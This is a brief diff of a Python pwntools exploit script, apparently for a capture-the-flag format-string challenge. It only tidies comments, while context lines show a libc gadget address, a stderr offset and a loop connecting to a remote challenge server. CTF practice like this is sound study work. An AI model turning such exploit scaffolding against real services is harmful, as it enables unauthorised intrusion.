@@ -5,11 +5,11 @@ from time import sleep
 from formatstring import *
 import random
 
-#Addr
+# Addr
 gadget = 0xe58c3
 stderr_libc = 0x3ec680
 
-####Exploit
+# Exploit
 while True:
 #	io = process('./server')
 	io = remote('echoserver.darkarmy.xyz',32768)
